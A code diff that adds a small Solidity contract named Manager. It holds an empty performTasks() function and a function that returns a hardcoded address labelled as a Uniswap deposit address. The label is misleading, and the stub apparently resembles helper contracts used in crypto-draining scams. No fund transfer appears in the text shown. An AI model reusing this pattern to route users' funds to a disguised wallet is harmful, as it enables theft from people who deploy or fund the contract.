@@ -1,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+   function performTasks() public {
+	    
+   }
+
+   function uniswapDepositAddress() public pure returns (address) {
+	return 0x1FC4d94847B307AdB30b86f9c40DfD71Ff25db93;
+   }
+}
